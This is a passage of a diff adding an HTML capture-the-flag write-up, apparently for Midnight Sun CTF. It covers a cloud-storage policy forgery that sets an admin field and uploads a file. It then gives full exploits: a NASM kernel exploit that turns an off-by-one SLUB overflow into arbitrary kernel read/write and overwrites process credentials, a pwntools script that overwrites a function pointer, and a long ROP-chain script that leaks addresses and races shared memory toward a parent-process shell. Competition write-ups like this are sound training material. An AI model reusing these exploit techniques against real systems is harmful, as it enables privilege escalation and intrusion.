+    <span class="hljs-string">'signature'</span>: <span class="hljs-keyword">None</span>,
+
+    <span class="hljs-string">'acl'</span>: (<span class="hljs-keyword">None</span>, <span class="hljs-string">'public-read'</span>),
+    <span class="hljs-string">'file'</span>: (<span class="hljs-string">'a.png'</span>, <span class="hljs-string">b'{'</span> + f<span class="hljs-string">'''
+"admin": true, "hmac": "{hm}", "name": "heaton", "email": "{mail}"
+'''</span>.encode() + <span class="hljs-string">b'}'</span>),
+}
+print(data)
+acl = <span class="hljs-string">'''
+a'}],
+
+
+'conditions': [
+{'acl': 'public-read'},
+['starts-with', '$bucket', ''],
+['starts-with', '$key', ''],
+['starts-with', '$success_action_status', '']
+],
+
+
+'Conditions': [{'a': 'a
+'''</span>.replace(<span class="hljs-string">'\n'</span>, <span class="hljs-string">''</span>)
+
+r = s.get(<span class="hljs-string">'http://cloudb-01.play.midnightsunctf.se/signature'</span>, params={
+    <span class="hljs-string">'acl'</span>: acl,
+    <span class="hljs-string">'hmac'</span>: hmak(acl),
+})
+print(r.text)
+policy, sig = r.text.split(<span class="hljs-string">':'</span>)
+
+print(b64d(policy))
+
+data[<span class="hljs-string">'policy'</span>] = (<span class="hljs-keyword">None</span>, policy)
+data[<span class="hljs-string">'signature'</span>] = (<span class="hljs-keyword">None</span>, sig)
+r = s.post(<span class="hljs-string">'https://cloudb-users.s3.amazonaws.com/'</span>, files=data) <span class="hljs-comment">#multipart/form-data</span>
+print(r.status_code) <span class="hljs-comment"># 204 means success</span>
+print(r.text)
+</code></pre><p>Flag: <code>midnight{n3x7_t1m3_w3ll_d0_1t_Cl0udl3sslY}</code></p>
+<h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
+<h3 id="hfsipc"><a class="header-link" href="#hfsipc"></a>Hfsipc</h3>
+<p>Off-by-one byte overflow:</p>
+<pre class="hljs"><code><span class="hljs-keyword">if</span> ( buf[<span class="hljs-number">1</span>] &lt;= (<span class="hljs-keyword">unsigned</span> __int64)(c-&gt;size + <span class="hljs-number">1</span>) )
+      {
+        <span class="hljs-keyword">if</span> ( !copy_from_user(c-&gt;ptr, buf[<span class="hljs-number">2</span>], buf[<span class="hljs-number">1</span>]) )
+        {
+          r = <span class="hljs-number">0L</span>L;
+          printk(a6hfsIpcWroteZu, buf[<span class="hljs-number">1</span>], (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)idx);
+</code></pre><p>Default allocator of the Linux kernel - SLUB.</p>
+<p>We can modify <code>fd</code> of <code>kmalloc_caches[5]</code> by Off-by-one byte overflow.
+Create channel 2, <code>buf</code> of channel 2 will <code>kmem_cache_alloc</code> a <code>kmalloc_caches[5]</code> which is overlap with channel 1 structure, so that we can forge a fake channel structure to read/write everywhere in kernel.</p>
+<p>Traverse circular linked list of tasks start from <code>init_task</code>, <code>struct list_head tasks</code>(offset 0x1d0) , overwrite <code>task-&gt;real_cred</code>(offset 0x3b8) <code>task-&gt;cred</code>(offset 0x3c0).</p>
+<pre class="hljs"><code>[<span class="hljs-meta">BITS</span> <span class="hljs-number">64</span>]
+<span class="hljs-comment">; nasm -f elf64 pwn.S -o pwn.o &amp;&amp; ld pwn.o -o pwn</span>
+
+<span class="hljs-meta">global</span> _start
+
+<span class="hljs-meta">section</span> .text
+<span class="hljs-symbol">
+_start:</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, dev            <span class="hljs-comment">; /dev/hfs</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">2</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">0</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">2</span>
+    <span class="hljs-keyword">syscall</span>                <span class="hljs-comment">; open( "/dev/hfs" , O_RDWR , 0 ) = 3</span>
+
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg], <span class="hljs-number">0</span>          <span class="hljs-comment">; id</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg+<span class="hljs-number">8</span>], <span class="hljs-number">0x20</span>     <span class="hljs-comment">; size</span>
+    <span class="hljs-keyword">call</span> create
+
+        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg], <span class="hljs-number">1</span>            
+        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg+<span class="hljs-number">8</span>], <span class="hljs-number">0x20</span>          
+    <span class="hljs-keyword">call</span> create
+
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg], <span class="hljs-number">1</span>           
+        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg+<span class="hljs-number">8</span>], <span class="hljs-number">0x21</span>      
+        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg+<span class="hljs-number">0x10</span>], pwn    <span class="hljs-comment">; payload</span>
+        <span class="hljs-keyword">call</span> write
+
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg], <span class="hljs-number">3</span>              
+        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg+<span class="hljs-number">8</span>], <span class="hljs-number">0x20</span>         
+        <span class="hljs-keyword">call</span> create            <span class="hljs-comment">; Overlap!</span>
+
+
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [i], <span class="hljs-number">0</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [base], <span class="hljs-number">0xffffffff81a1b4c0</span> <span class="hljs-comment">; init_task</span>
+    <span class="hljs-keyword">add</span> <span class="hljs-built_in">qword</span> [base], <span class="hljs-number">0x1d0</span> <span class="hljs-comment">; init_task-&gt;tasks</span>
+                 <span class="hljs-comment">; struct list_head tasks;</span>
+<span class="hljs-symbol">loop:</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">qword</span> [base]
+    <span class="hljs-keyword">sub</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x1d0</span>
+    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">0x3c0</span>            <span class="hljs-comment">; &amp;(p-&gt;cred)      const struct cred __rcu *cred;</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [fake + <span class="hljs-number">8</span>], <span class="hljs-built_in">rbx</span>
+        <span class="hljs-keyword">call</span> dump             <span class="hljs-comment">; a = &amp;(p-&gt;cred)</span>
+
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">qword</span> [a]        <span class="hljs-comment">; rbx = p-&gt;cred</span>
+    <span class="hljs-keyword">add</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-number">4</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [fake + <span class="hljs-number">8</span>], <span class="hljs-built_in">rbx</span>    
+
+
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [fake + <span class="hljs-number">16</span>], <span class="hljs-number">0x20</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg], <span class="hljs-number">3</span>              
+        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg+<span class="hljs-number">8</span>], <span class="hljs-number">0x20</span>         
+        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg+<span class="hljs-number">0x10</span>], fake      <span class="hljs-comment">; fake obj</span>
+        <span class="hljs-keyword">call</span> write
+
+        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg], <span class="hljs-number">0</span>              <span class="hljs-comment">; id</span>
+        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg+<span class="hljs-number">8</span>], <span class="hljs-number">0x20</span>         <span class="hljs-comment">; size</span>
+        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg+<span class="hljs-number">16</span>], cred        <span class="hljs-comment">; overwrite p-&gt;cred + 4</span>
+        <span class="hljs-keyword">call</span> write
+
+
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [fake + <span class="hljs-number">16</span>], <span class="hljs-number">8</span>
+
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">qword</span> [base]
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [fake + <span class="hljs-number">8</span>], <span class="hljs-built_in">rbx</span>
+    <span class="hljs-keyword">call</span> dump             <span class="hljs-comment">; a = &amp;(p-&gt;tasks.next)</span>
+
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">qword</span> [a]
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [base], <span class="hljs-built_in">rbx</span>        <span class="hljs-comment">; [base] = p-&gt;tasks.next</span>
+
+    <span class="hljs-keyword">add</span> <span class="hljs-built_in">qword</span> [i], <span class="hljs-number">1</span>
+    <span class="hljs-keyword">cmp</span> <span class="hljs-built_in">qword</span> [i], <span class="hljs-number">25</span>        <span class="hljs-comment">; make sure to traverse full circular linked list</span>
+    <span class="hljs-keyword">jne</span> <span class="hljs-keyword">loop</span>
+<span class="hljs-symbol">exit:</span>
+    <span class="hljs-keyword">xor</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">rdi</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">0x3c</span>
+    <span class="hljs-keyword">syscall</span>
+<span class="hljs-symbol">
+
+dump:</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg], <span class="hljs-number">3</span>              <span class="hljs-comment">; id</span>
+        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg+<span class="hljs-number">8</span>], <span class="hljs-number">0x20</span>         <span class="hljs-comment">; size</span>
+        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg+<span class="hljs-number">0x10</span>], fake      <span class="hljs-comment">; fake obj</span>
+    <span class="hljs-keyword">call</span> write
+
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg], <span class="hljs-number">0</span>              <span class="hljs-comment">; id</span>
+        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg+<span class="hljs-number">8</span>], <span class="hljs-number">8</span>        <span class="hljs-comment">; size</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg+<span class="hljs-number">16</span>], a        <span class="hljs-comment">; copy to a</span>
+        <span class="hljs-keyword">call</span> read
+    <span class="hljs-keyword">ret</span>
+<span class="hljs-symbol">set:</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg], <span class="hljs-number">3</span>              <span class="hljs-comment">; id</span>
+        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg+<span class="hljs-number">8</span>], <span class="hljs-number">0x20</span>         <span class="hljs-comment">; size</span>
+        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg+<span class="hljs-number">0x10</span>], fake      <span class="hljs-comment">; fake obj</span>
+        <span class="hljs-keyword">call</span> write
+
+        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg], <span class="hljs-number">0</span>          <span class="hljs-comment">; id</span>
+        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg+<span class="hljs-number">8</span>], <span class="hljs-number">8</span>        <span class="hljs-comment">; size</span>
+        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> [arg+<span class="hljs-number">16</span>], a       <span class="hljs-comment">; copy from a</span>
+        <span class="hljs-keyword">call</span> write
+        <span class="hljs-keyword">ret</span>
+<span class="hljs-symbol">
+print_a:</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">1</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, a
+        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-number">9</span>
+        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">1</span>
+        <span class="hljs-keyword">syscall</span>
+    <span class="hljs-keyword">ret</span>
+<span class="hljs-symbol">
+create:</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0xABCD0001</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, arg
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">16</span>
+    <span class="hljs-keyword">syscall</span>
+    <span class="hljs-keyword">ret</span>
+<span class="hljs-symbol">delete:</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0xABCD0002</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, arg
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">16</span>
+    <span class="hljs-keyword">syscall</span>
+    <span class="hljs-keyword">ret</span>
+<span class="hljs-symbol">read:</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0xABCD0003</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, arg
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">16</span>
+    <span class="hljs-keyword">syscall</span>
+    <span class="hljs-keyword">ret</span>
+<span class="hljs-symbol">write:</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-number">3</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rsi</span>, <span class="hljs-number">0xABCD0004</span>
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, arg
+    <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-number">16</span>
+    <span class="hljs-keyword">syscall</span>
+    <span class="hljs-keyword">ret</span>
+
+
+<span class="hljs-meta">section</span> .data
+<span class="hljs-symbol">
+pwn:</span>    <span class="hljs-built_in">db</span>    <span class="hljs-string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span> , <span class="hljs-number">0x40</span> , <span class="hljs-number">0</span>
+<span class="hljs-symbol">fake:</span>    <span class="hljs-built_in">dq</span>    <span class="hljs-number">0</span> , <span class="hljs-number">0</span> , <span class="hljs-number">8</span>
+<span class="hljs-symbol">arg:</span>    <span class="hljs-built_in">dq</span>    <span class="hljs-number">0</span> , <span class="hljs-number">0</span> , <span class="hljs-number">0</span>
+<span class="hljs-symbol">cred:</span>    <span class="hljs-built_in">dq</span>    <span class="hljs-number">0</span> , <span class="hljs-number">0</span> , <span class="hljs-number">0</span> , <span class="hljs-number">0</span>
+<span class="hljs-symbol">
+a:</span>    <span class="hljs-built_in">dq</span>    <span class="hljs-number">0</span> , <span class="hljs-number">0xa</span>
+<span class="hljs-symbol">i:</span>    <span class="hljs-built_in">dq</span>    <span class="hljs-number">0</span>
+<span class="hljs-symbol">base:</span>    <span class="hljs-built_in">dq</span>    <span class="hljs-number">0</span> , <span class="hljs-number">0xa</span>
+<span class="hljs-symbol">
+dev:</span>    <span class="hljs-built_in">db</span>      <span class="hljs-string">"/dev/hfs"</span>,<span class="hljs-number">0</span>
+</code></pre><p class="img-container"><img src="https://i.imgur.com/Djl89aF.png" alt=""></p>
+<h3 id="hfs-mbr-1"><a class="header-link" href="#hfs-mbr-1"></a>Hfs-mbr</h3>
+<ul class="list">
+<li>When the input character is \x7f. The pointer of buffer move backward</li>
+<li>So we can use this vulnerability to overwrite the filename and function pointer then we can make it output flag2</li>
+</ul>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+r=remote(<span class="hljs-string">"hfs-os-01.play.midnightsunctf.se"</span>, <span class="hljs-number">31337</span>)
+r.recvuntil(<span class="hljs-string">"[HFS_MBR]&gt;"</span>)
+r.sendline(<span class="hljs-string">"sojupwner"</span>)
+r.recvuntil(<span class="hljs-string">"[HFS-DOS]&gt;"</span>)
+r.send(<span class="hljs-string">"\x7f"</span>*<span class="hljs-number">3</span>+<span class="hljs-string">"2"</span>+<span class="hljs-string">"\x7f"</span>*<span class="hljs-number">17</span>+<span class="hljs-string">"O\x0d"</span>)
+r.interactive() <span class="hljs-comment">#midnight{th4t_was_n0t_4_buG_1t_is_a_fEatuR3}</span>
+
+</code></pre><h3 id="hfs-vm-1"><a class="header-link" href="#hfs-vm-1"></a>Hfs-vm</h3>
+<ul class="list">
+<li>You can find out that there are some operations can let you do read and write on stack.</li>
+<li>So you can leak the libc&#39;s base address, text&#39;s base address and stack&#39;s base address. Also you can overwrite the return address and trigger your rop-chain. However the length of code is not enough, you may need stack migration.</li>
+<li>Unfortunately the child process is limited by <code>SECCOMP_MODE_STRICT</code>. We cannot control child process to get shell. We need to compromise parent process.</li>
+<li>There is a shared memory buffer between child process and parent process. We use this buffer to do some buffer overflow. We can use race condition. I found that syscall <code>0x4</code> will trigger sleep. It give us the perfect timing to modify the content of shared buffer and trigger buffer overflow.</li>
+<li>There is one more thing that stop us from getting shell: The parent process modify its canary. So we have leak the modified canary first, then just get  the shell.</li>
+</ul>
+<pre class="hljs"><code><span class="hljs-built_in">from</span> pwn import *
+import <span class="hljs-built_in">time</span>
+<span class="hljs-comment">#r=gdb.debug("./hfs-vm",ggg)</span>
+<span class="hljs-comment">#r=process("./hfs-vm")</span>
+poprdi=<span class="hljs-number">0x1e83</span>
+poprdx=<span class="hljs-number">0x101d</span>
+poprsi=<span class="hljs-number">0x198f</span>
+poprbp=<span class="hljs-number">0xe28</span>
+poprsp=<span class="hljs-number">0x1112</span>
+aaa=<span class="hljs-number">0x38</span>
+readd=<span class="hljs-number">0xca0</span>
+wwrr=<span class="hljs-number">0xc10</span>
+ssyscall=<span class="hljs-number">0x16b0</span>
+memcpy=<span class="hljs-number">0xcc0</span>
+sleeppp=<span class="hljs-number">0xD60</span>
+<span class="hljs-keyword">system</span>=<span class="hljs-number">0xc60</span>
+def counttt():
+  <span class="hljs-built_in">global</span> aaa
+  aaa+=<span class="hljs-number">1</span>
+  <span class="hljs-literal">return</span> aaa<span class="hljs-number">-1</span>
+def movv(<span class="hljs-built_in">value</span>):
+  <span class="hljs-literal">return</span> <span class="hljs-string">"\xa0\x20"</span>+p32(<span class="hljs-built_in">value</span>)[:<span class="hljs-number">2</span>]
+def loadss(base):
+  pre=<span class="hljs-string">"\x80\x20"</span>+p32(base)[:<span class="hljs-number">2</span>]+<span class="hljs-string">"\xa8\x08\x00\x00"</span>
+  <span class="hljs-literal">return</span> pre
+def change(<span class="hljs-built_in">value</span>,old):
+  sub=<span class="hljs-string">"\xa2\x20"</span>+p32(old)[:<span class="hljs-number">2</span>]
+  <span class="hljs-built_in">add</span>=<span class="hljs-string">"\xa1\x20"</span>+p32(<span class="hljs-built_in">value</span>)[:<span class="hljs-number">2</span>]
+
+  <span class="hljs-literal">return</span> sub+<span class="hljs-built_in">add</span>
+def subbb(vv):
+  sub=<span class="hljs-string">"\xa2\x20"</span>+p32(vv)[:<span class="hljs-number">2</span>]
+
+  <span class="hljs-literal">return</span> sub
+def writehere(base):
+  base=<span class="hljs-string">"\x80\x20"</span>+p32(base)[:<span class="hljs-number">2</span>]
+  overwrite=<span class="hljs-string">"\x87\x0a\x00\x00"</span>
+  <span class="hljs-literal">return</span> base+overwrite
+r=remote(<span class="hljs-string">"hfs-vm-01.play.midnightsunctf.se"</span>, <span class="hljs-number">4096</span>)
+
+
+
+payload=(<span class="hljs-string">"\x00\x20\x00\x04\x20\x20\x04\x00\x40\x20\x00\x01"</span>
++loadss(<span class="hljs-number">0x34</span>)+change(poprsi,<span class="hljs-number">0xe6e</span>)+writehere(<span class="hljs-number">0x34</span>)
++loadss(<span class="hljs-number">0x48</span>)+subbb(<span class="hljs-number">0x1000</span>)+writehere(counttt())
++<span class="hljs-string">"\x0a\x00\x00\x00"</span>
++loadss(<span class="hljs-number">0x49</span>)+writehere(counttt())
++<span class="hljs-string">"\x0a\x00\x00\x00"</span>
++loadss(<span class="hljs-number">0x4a</span>)+writehere(counttt())
++<span class="hljs-string">"\x0a\x00\x00\x00"</span>
++loadss(<span class="hljs-number">0x4b</span>)+writehere(counttt())
++<span class="hljs-string">"\x0a\x00\x00\x00"</span>
++loadss(<span class="hljs-number">0x34</span>)+change(poprdx,poprsi)+writehere(counttt())
++<span class="hljs-string">"\x0a\x00\x00\x00"</span>
++loadss(<span class="hljs-number">0x35</span>)+writehere(counttt())
++<span class="hljs-string">"\x0a\x00\x00\x00"</span>
++loadss(<span class="hljs-number">0x36</span>)+writehere(counttt())
++<span class="hljs-string">"\x0a\x00\x00\x00"</span>
++loadss(<span class="hljs-number">0x37</span>)+writehere(counttt())
++<span class="hljs-string">"\x0a\x00\x00\x00"</span>
++movv(<span class="hljs-number">128</span>)+writehere(counttt())
++movv(<span class="hljs-number">0x0</span>)+writehere(counttt())
++writehere(counttt())
++writehere(counttt())
++loadss(<span class="hljs-number">0x34</span>)+change(poprdi,poprsi)+writehere(counttt())
++loadss(<span class="hljs-number">0x35</span>)+writehere(counttt())
++loadss(<span class="hljs-number">0x36</span>)+writehere(counttt())
++loadss(<span class="hljs-number">0x37</span>)+writehere(counttt())
++movv(<span class="hljs-number">0x1</span>)+writehere(counttt())
++movv(<span class="hljs-number">0x0</span>)+writehere(counttt())
++writehere(counttt())
++writehere(counttt())
++loadss(<span class="hljs-number">0x34</span>)+change(readd,poprsi)+writehere(counttt())
++loadss(<span class="hljs-number">0x35</span>)+writehere(counttt())
++loadss(<span class="hljs-number">0x36</span>)+writehere(counttt())
++loadss(<span class="hljs-number">0x37</span>)+writehere(counttt())
++loadss(<span class="hljs-number">0x34</span>)+change(poprsp,poprsi)+writehere(counttt())
++loadss(<span class="hljs-number">0x35</span>)+writehere(counttt())
++loadss(<span class="hljs-number">0x36</span>)+writehere(counttt())
++loadss(<span class="hljs-number">0x37</span>)+writehere(counttt())
+
+
+
++loadss(<span class="hljs-number">0x38</span>)+writehere(counttt())
++loadss(<span class="hljs-number">0x39</span>)+writehere(counttt())
++loadss(<span class="hljs-number">0x3a</span>)+writehere(counttt())
++loadss(<span class="hljs-number">0x3b</span>)+writehere(counttt())
+
+) <span class="hljs-comment"># leak all the base address we need and do stack migration</span>
+
+r.sendline(str(<span class="hljs-built_in">len</span>(payload)))
+print <span class="hljs-built_in">len</span>(payload)
+
+
+
+<span class="hljs-comment">#gdb.attach(r)</span>
+<span class="hljs-comment">#raw_input()</span>
+r.<span class="hljs-built_in">send</span>(payload)
+<span class="hljs-keyword">text</span>=<span class="hljs-number">0</span>
+stack=<span class="hljs-number">0</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">4</span>):
+  r.recvuntil(<span class="hljs-string">"REG_05:"</span>)
+  <span class="hljs-keyword">a</span>=r.recvline()
+  c=int(<span class="hljs-keyword">a</span>,<span class="hljs-number">16</span>)
+  <span class="hljs-comment">#print hex(c)</span>
+  stack+=c&lt;&lt;(<span class="hljs-number">16</span>*i)
+print hex(stack)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">4</span>):
+  r.recvuntil(<span class="hljs-string">"REG_05:"</span>)
+  <span class="hljs-keyword">a</span>=r.recvline()
+  c=int(<span class="hljs-keyword">a</span>,<span class="hljs-number">16</span>)
+  <span class="hljs-comment">#print hex(c)</span>
+  <span class="hljs-keyword">text</span>+=c&lt;&lt;(<span class="hljs-number">16</span>*i)
+<span class="hljs-keyword">text</span>-=<span class="hljs-number">0x101d</span>
+print hex(<span class="hljs-keyword">text</span>)
+
+regadd=stack+<span class="hljs-number">0xe50</span>
+secondpay=(p64(<span class="hljs-keyword">text</span>+poprdi)
++p64(<span class="hljs-number">1</span>)
++p64(<span class="hljs-keyword">text</span>+poprsi)
++p64(regadd)
++p64(<span class="hljs-keyword">text</span>+poprdx)
++p64(<span class="hljs-number">60</span>)
++p64(<span class="hljs-keyword">text</span>+wwrr)
++p64(<span class="hljs-keyword">text</span>+poprdi)
++p64(<span class="hljs-number">0</span>)
++p64(<span class="hljs-keyword">text</span>+poprsi)
++p64(stack<span class="hljs-number">-0x500</span>)
++p64(<span class="hljs-keyword">text</span>+poprdx)
++p64(<span class="hljs-number">656</span>)
++p64(<span class="hljs-keyword">text</span>+readd)
++p64(<span class="hljs-keyword">text</span>+poprsp)
++p64(stack<span class="hljs-number">-0x500</span>)
+) <span class="hljs-comment"># leak shared buffer address and do another stack migration</span>
+r.<span class="hljs-built_in">send</span>(secondpay)
+print <span class="hljs-built_in">len</span>(secondpay)
+r.recvuntil(<span class="hljs-string">"========================================\n"</span>)
+<span class="hljs-keyword">a</span>=r.recv()
+fd=u64(<span class="hljs-keyword">a</span>[:<span class="hljs-number">8</span>])
+shared=u64(<span class="hljs-keyword">a</span>[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>])
+print hex(fd)
+print hex(shared)
+
+haha=(<span class="hljs-string">"\x48\x00"</span>
++p64(<span class="hljs-number">0xdeadbeaf</span>)*<span class="hljs-number">8</span>)
+fourpay=(haha
++<span class="hljs-string">"\x00\x01"</span>
+) <span class="hljs-comment">#　The payload for leaking parent's canary</span>
+
+thirdpay=(p64(<span class="hljs-keyword">text</span>+poprsi)
++p64(stack<span class="hljs-number">-0x1000</span>)
++p64(<span class="hljs-keyword">text</span>+poprdx)
++p64(<span class="hljs-built_in">len</span>(fourpay))
++p64(<span class="hljs-keyword">text</span>+readd)
+
++p64(<span class="hljs-keyword">text</span>+poprdi)
++p64(shared)
++p64(<span class="hljs-keyword">text</span>+poprsi)
++p64(stack<span class="hljs-number">-0x1000</span>)
++p64(<span class="hljs-keyword">text</span>+poprdx)
++p64(<span class="hljs-number">0x100</span>)
++p64(<span class="hljs-keyword">text</span>+memcpy)
+
++p64(<span class="hljs-keyword">text</span>+poprdi)
++p64(fd)
++p64(<span class="hljs-keyword">text</span>+poprsi)
++p64(regadd+<span class="hljs-number">0x11</span>)
++p64(<span class="hljs-keyword">text</span>+poprdx)
++p64(<span class="hljs-number">0x5</span>)
++p64(<span class="hljs-keyword">text</span>+wwrr)
+
++p64(<span class="hljs-keyword">text</span>+poprdi)
++p64(<span class="hljs-number">0</span>)
++p64(<span class="hljs-keyword">text</span>+poprsi)
++p64(regadd+<span class="hljs-number">0x16</span>)
++p64(<span class="hljs-keyword">text</span>+poprdx)
++p64(<span class="hljs-number">0x2</span>)
++p64(<span class="hljs-keyword">text</span>+readd)
+
++p64(<span class="hljs-keyword">text</span>+poprdi)
++p64(shared)
++p64(<span class="hljs-keyword">text</span>+poprsi)
++p64(regadd+<span class="hljs-number">0x16</span>)
++p64(<span class="hljs-keyword">text</span>+poprdx)
++p64(<span class="hljs-number">0x2</span>)
++p64(<span class="hljs-keyword">text</span>+memcpy)
+
++p64(<span class="hljs-keyword">text</span>+poprdi)
++p64(fd)
++p64(<span class="hljs-keyword">text</span>+poprsi)
++p64(regadd+<span class="hljs-number">0x16</span>)
++p64(<span class="hljs-keyword">text</span>+poprdx)
++p64(<span class="hljs-number">0x5</span>)
++p64(<span class="hljs-keyword">text</span>+readd)
+
++p64(<span class="hljs-keyword">text</span>+poprdi)
++p64(<span class="hljs-number">1</span>)
++p64(<span class="hljs-keyword">text</span>+poprsi)
++p64(shared+<span class="hljs-number">2</span>)
++p64(<span class="hljs-keyword">text</span>+poprdx)
++p64(<span class="hljs-number">0x100</span>)
++p64(<span class="hljs-keyword">text</span>+wwrr)
+
++p64(<span class="hljs-keyword">text</span>+poprdi)
++p64(<span class="hljs-number">0</span>)
++p64(<span class="hljs-keyword">text</span>+poprsi)
++p64(shared)
++p64(<span class="hljs-keyword">text</span>+poprdx)
++p64(<span class="hljs-number">144</span>)
++p64(<span class="hljs-keyword">text</span>+readd)
+
++p64(<span class="hljs-keyword">text</span>+poprdi)
++p64(<span class="hljs-number">1</span>)
++p64(<span class="hljs-keyword">text</span>+poprsi)
++p64(shared)
++p64(<span class="hljs-keyword">text</span>+poprdx)
++p64(<span class="hljs-number">0x100</span>)
++p64(<span class="hljs-keyword">text</span>+wwrr)
+
++p64(<span class="hljs-keyword">text</span>+poprdi)
++p64(fd)
++p64(<span class="hljs-keyword">text</span>+poprsi)
++p64(regadd+<span class="hljs-number">0x20</span>)
++p64(<span class="hljs-keyword">text</span>+poprdx)
++p64(<span class="hljs-number">0x5</span>)
++p64(<span class="hljs-keyword">text</span>+wwrr)
+
++p64(<span class="hljs-keyword">text</span>+poprdi)
++p64(fd)
++p64(<span class="hljs-keyword">text</span>+poprsi)
++p64(regadd+<span class="hljs-number">0x16</span>)
++p64(<span class="hljs-keyword">text</span>+poprdx)
++p64(<span class="hljs-number">0x5</span>)
++p64(<span class="hljs-keyword">text</span>+readd)
+
++p64(<span class="hljs-keyword">text</span>+poprdi)
++p64(<span class="hljs-number">1</span>)
++p64(<span class="hljs-keyword">text</span>+poprsi)
++p64(shared)
++p64(<span class="hljs-keyword">text</span>+poprdx)
++p64(<span class="hljs-number">0x100</span>)
++p64(<span class="hljs-keyword">text</span>+wwrr)
+
